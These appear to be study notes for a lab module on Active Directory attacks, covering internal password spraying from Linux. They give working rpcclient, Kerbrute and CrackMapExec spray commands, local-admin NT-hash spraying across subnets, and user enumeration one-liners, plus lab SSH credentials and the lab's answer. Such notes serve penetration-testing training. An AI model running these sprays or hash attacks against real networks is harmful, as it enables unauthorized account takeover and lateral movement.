# NOTE — Internal Password Spraying - from Linux

## ID
530

## Module
Active Directory Enumeration & Attacks

## Kind
notes

## Title
Section 11 — Internal Password Spraying - from Linux

## Description
Covers internal password spraying techniques from a Linux attack host using rpcclient, Kerbrute, and CrackMapExec, including local admin hash spraying across subnets.

## Tags
password-spraying, crackmapexec, kerbrute, rpcclient, active-directory, lateral-movement

## Commands
- `for u in $(cat valid_users.txt);do rpcclient -U "$u%<PASSWORD>" -c "getusername;quit" <DC_IP> | grep Authority; done`
- `kerbrute passwordspray -d <DOMAIN> --dc <DC_IP> valid_users.txt <PASSWORD>`
- `sudo crackmapexec smb <DC_IP> -u valid_users.txt -p <PASSWORD> | grep +`
- `sudo crackmapexec smb <DC_IP> -u <USER> -p <PASSWORD>`
- `sudo crackmapexec smb --local-auth <SUBNET> -u administrator -H <NT_HASH> | grep +`
- `enum4linux -U <DC_IP> | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"`

## What This Section Covers
Internal password spraying is one of two main avenues for gaining domain credentials once you have a foothold. This section walks through three Linux tools for spraying — rpcclient, Kerbrute, and CrackMapExec — and extends the technique to local administrator password reuse across entire subnets using NT hashes.

## Methodology
1. Build a valid users list with `enum4linux -U <DC_IP> | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"` (or rpcclient / ldapsearch). Save output to `valid_users.txt`.
2. Spray with **rpcclient** — loop through users with a single password and grep for `Authority` (successful login indicator): `for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done`
3. Spray with **Kerbrute** — faster, uses Kerberos pre-auth: `kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1`
4. Spray with **CrackMapExec** — most versatile, grep `+` to filter successes: `sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Welcome1 | grep +`
5. Validate any hits individually: `sudo crackmapexec smb 172.16.5.5 -u <USER> -p <PASSWORD>`
6. If you have a local admin NT hash, spray it across the subnet with `--local-auth` to find password reuse: `sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H <HASH> | grep +`

## Step-by-Step Lab Walkthrough

### 1. SSH into the attack box
```
ssh htb-student@10.129.17.46
# password: HTB_@cademy_stdnt!
```

### 2. Enumerate all domain users
```
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```
This pulls every user account from the DC via RPC and strips it down to just usernames.
* When you know is AD or scan show SMB /NetBIOS / RPC 

kerbrute userenum -d inlanefreigh.local --dc 172.16.5.5 /opt/jsmith.txt

ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT, DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
### 3. Save the output to a file
One-shot approach:
```
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]" > valid_users.txt
```
Or manually: copy the usernames, `nano valid_users.txt`, paste (one per line), save.

### 4. Password spray with CrackMapExec
```
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Welcome1 | grep +
```
Tries `Welcome1` against every user in the list; `grep +` filters for successful logins only.

### 5. Read the output
```
SMB  172.16.5.5  445  ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\sgage:Welcome1
```
Answer: **sgage**

## Lab — Questions & Answers
| Q | Answer | Found In / Method |
|---|--------|-------------------|
| Q1: Find the user account starting with "s" that has the password Welcome1 | sgage | `sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Welcome1 \| grep +` — user list built via `enum4linux -U` |

## Key Takeaways
- rpcclient success is not obvious — you must grep for `Authority` in the output; absence of it means failure.
- CrackMapExec is the most flexible tool here: supports user lists, hash spraying, and the critical `--local-auth` flag.
- Always use `--local-auth` when spraying local admin hashes — without it, CME tries domain auth and can lock out the built-in domain Administrator.
- Local admin password reuse is extremely common due to gold images / automated deployments — always check even if it's not your main attack path.
- Target high-value hosts (Exchange, SQL servers) for local admin spraying — they're more likely to have privileged sessions or cached creds.
- LAPS is the remediation for local admin reuse — worth noting in reports.

## Gotchas
- Forgetting `--local-auth` on CME when spraying local admin hashes can lock out the domain-level Administrator account.
- rpcclient doesn't clearly show failed logins — if you don't grep for `Authority`, you'll drown in noise.
- When building user lists, patterns like `$desktop%@admin123` → `$server%@admin123` are worth trying — password format reuse across host types is common.


<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|ad-enum-attacks]]  
← [[10-password-spraying-user-list]] | [[12-internal-password-spraying-windows]] →
<!-- AUTO-LINKS-END -->
